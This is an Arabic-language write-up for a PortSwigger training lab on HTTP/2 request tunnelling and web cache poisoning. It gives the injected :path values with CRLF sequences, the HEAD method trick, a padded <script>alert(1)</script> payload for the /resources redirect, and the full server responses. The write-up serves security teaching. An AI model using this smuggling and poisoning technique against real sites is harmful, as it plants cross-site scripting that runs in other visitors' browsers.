# [Web cache poisoning via HTTP/2 request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling)

## **`الهدف`**
قم بتسميم ذاكرة التخزين المؤقت باستجابة تقوم بتنفيذ `alert(1)` في متصفح الضحية.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater` 
```http
GET / HTTP/2
Host: 0a9800a804c4999d81926bdf0079001a.web-security-academy.net
Cookie: session=50aEokUCfBjFsSAt2I4XYhDi5zfnYvAE
```
ثم سنقوم بتنفيذ `HTTP/2 request splitting` بخدعة `Kettled` وهذا يجب أن يتم من داخل `Inspector` عن طريق تعديل قيمة الترويسة الزائفة باسم: `:path` لتصبح قيمتها كالتالي:
```http
/?TEST=1 HTTP/1.1
TEST1: TEST2
```
وسنلاحظ أن الاستجابة طبيعية وهذا يعنى أنه يمكننا الحقن بنجاح عن طريق الترويسة الزائفة `:pacth`

لذلك سنقوم بتعديل قيمة الترويسة مرة أخرى لتصبح:
```http
/?TEST=1 HTTP/1.1\r\n
Host: 0a9800a804c4999d81926bdf0079001a.web-security-academy.net\r\n
\r\n
GET /post?postId=2 HTTP/1.1\r\n
\r\n
```
بالإضافة إلى تعديل قيمة الترويسة الزائفة `:method` من `GET` إلى `HEAD`
وسنجد أن الطلب المُمرر عبر النفق قد انعكس في الاستجابة
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=Km8vgnsXtMteqWUgN0K6Z4uoYqdND4q6; Secure; HttpOnly; SameSite=None
Content-Length: 11742
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=CNgC5MO95Boxq7huNXsDvpYMf0whOECi; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=0
Content-Length: 11554

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Web cache poisoning via HTTP/2 request tunnelling</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Web cache poisoning via HTTP/2 request tunnelling</h2>
                            <a class=link-back href='https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aWeb+cache+poisoning+via+HTTP%2f2+request+tunnelling%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2frequest-smuggling%2fadvanced%2frequest-tunnelling%2flab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2frequest-smuggling%2fadvanced%2frequest-tunnelling%2flab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/39.jpg">
                    <h1>The Art Of Communication</h1>
                    <p><span id=blog-author>Carl Bondioxide</span> | 13 September 2026</p>
                    <hr>
                    <p>I&apos;m a bit of a Francophile, so when I travel to France I love to speak their language. I&apos;m by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of whom speak French; in fact, it&apos;s almost as though my partner refuses to speak it, he thinks we can all get by on sign language and mime.</p>
                    <p>Neither of my companions understand why I would continue to speak French when the other person is speaking English. I try to explain they want to practice their English in the same way. I speak French and they speak English, and to be honest I probably wouldn&apos;t understand a lot of what they are saying in French, as it is too fast for my comprehension.</p>
                    <p>Asking for directions isn&apos;t too hard, following the answer is, even if you do know your &apos;la gauche&apos; from your &apos;droite&apos;. The easiest option would be to hand them a map and point to your destination, or ask &apos;where am I?&apos; And get them to point at the map. But I think that&apos;s just plain rude, I like to start with a nice salutation and take it from there, even if it doesn&apos;t get me to where I want to go, just smile and wave, smile and wave. In the meantime Mr. Cynical is doing an elaborate dance, arms flailing, finger pointing with the odd preposition thrown in for good measure. It strongly resembles a game of Charades. Then there&apos;s a wave of the hand and off we trot as he says he knows where to go now. So frustrating!</p>
                    <p>I&apos;ve discovered as my memory is starting to fail me I use my hands much more when talking, and trying to remember words. This too becomes a game of charades, and quite a tricky way to conduct a conversation. It can also be quite dangerous, I have often knocked drinks over people as I become excited and animated trying to think of a word which suddenly comes to me. There has even been the odd punch in the face and poke in the eye. I have become a serial mover of potential targets, things not people. I rearrange everything on the table to keep my companions in a safe zone, then try to sit far enough away they won&apos;t be on the receiving end of my out of control limbs.</p>
                    <p>It is possible to get by on mime and gesticulation, I&apos;ve trained my dog using sign language, mostly because she won&apos;t listen to a thing I ask her to do, so in my frustration I started &apos;acting&apos; out, and things just snowballed from there. If you&apos;ve ever watched Mr. Bean then you&apos;ll know what I&apos;m talking about.</p>
                    <div/>
                    <hr>
                    <h1>Comments</h1>
                    <div class=is-warning>Comments may take some time to appear while being moderated</div>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Bob Forapples | 19 September 2026
                        </p>
                        <p>I was so engrossed in this blog I didn&apos;t realise my house was being burgled. Is this some sort of scam?</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Si Patch | 23 September 2026
                        </p>
                        <p>That&apos;s it, I&apos;m moving to Yemen. There&apos;s no one home so I thought I&apos;d write it here.</p>
                        <p></p>
                    </section>
                    <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            Harry Legs | 30 September 2026
                        </p>
                        <p>My mom was a famous writer, I&apos;ll put you in touch if you like.</p>
                        <p></p>
                    </section>
                    <hr>
                    <section class="add-comment">
                        <h2>Leave a comment</h2>
                        <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
                            <input required type="hidden" name="csrf" value="SNHmx18bUtJ14mc1NlY5taZMppWFubG2">
                            <input required type="hidden" name="postId" value="2">
                            <label>Comment:</label>
                            <textarea required rows="12" cols="300" name="comment"></textarea>
                                    <label>Name:</label>
                                    <input required type="text" name="name">
                                    <label>Email:</label>
                                    <input required type="email" name="email">
                                    <label>Website:</label>
                                    <input pattern="(http:|https:).+" type="text" name="website">
                            <button class="button" type="submit">Post Comment</button>
                        </form>
                    </section>
                    <div class="is-linkback">
                        <a href="/">Back to Blog</a>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div> 
```

==**`ملاحظة هامة جدًا:`**== في الحل الرسمي على الـ `PortSwigger` كانوا يقومون بتعديل قيمة الترويسة لتكون
```http
/?TEST=1 HTTP/1.1\r\n
Host: 0a9800a804c4999d81926bdf0079001a.web-security-academy.net\r\n
\r\n
GET /post?postId=2 HTTP/1.1\r\n
TEST1: TEST2
```

ولكن هذه القيمة لم تنجح معي على الإطلاق وكانت تظهر استجابة كالتالي:
```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```

بعد ذلك إذا جربنا إرسال طلب إلى `GET /resources`
```http
GET /resources HTTP/2
Host: 0a9800a804c4999d81926bdf0079001a.web-security-academy.net
Cookie: session=50aEokUCfBjFsSAt2I4XYhDi5zfnYvAE
```
سنجد أن الاستجابة تقوم بعمل إعادة توجيه إلى `/resources/`
```http
HTTP/2 302 Found
Location: /resources/
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```

لذلك سنترك الترويسة الزائفة `:method` بقيمة `HEAD` كما هي ثم سنقوم بتعديل قيمة الترويسة الزائفة `:path` مرة أخرى لتصبح:
```http
/?TEST=1 HTTP/1.1
Host: 0a9800a804c4999d81926bdf0079001a.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
\r\n
```

ولكن سنلاحظ أن هناك مشكلة في الاستجابة بسبب اختلاف عدد البايتس المتوقع استلامهما
```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Content-Length: 150

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Received only 316 of expected 8497 bytes of data</h1></body></html>
```

==**`ملاحظة هامة جدًا:`**== في الحل الرسمي على الـ `PortSwigger` كانوا يقومون بتعديل قيمة الترويسة لتكون
```http
/?TEST=1 HTTP/1.1
Host: 0a9800a804c4999d81926bdf0079001a.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
TEST1: TEST2
```

ولكن هذه القيمة لم تنجح معي على الإطلاق وكانت تظهر استجابة كالتالي:
```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```

والأن سنقوم بحذف الـ `Cache Buster` من قيمة الترويسة الزائفة `:path` ثم وضع كمية كبيرة جدًا (حوالى 8200 حرف بعد تاجز `</script>` ) كالتالي:
```http
/ HTTP/1.1
Host: 0a9800a804c4999d81926bdf0079001a.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script>TESTTESTTEST..........ETC HTTP/1.1\r\n
\r\n
```

وسنجد أنها تنعكس في الاستجابة بشكل طبيعى كما أنها تُحفظ في ذاكرة التخزين المؤقت، وإذا قمنا بفتح الصفحة الرئيسية للاب سنجد الـ `POP-UP` تظهر بنجاح
```HTTP
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8774
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 1
X-Cache: hit

HTTP/1.1 302 Found
Location: /resources/?<script>alert(1)</script>TESTTESTTEST..........ETC
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=0
Content-Length: 0

HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
Connection: close
Content-Length: 27

{"error":"Invalid request
```
وقد نحتاج إلى إرساله عدة مرات لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Response queue poisoning via H2.TE request smuggling](./Response-queue-poisoning-via-H2.TE-request-smuggling.md)
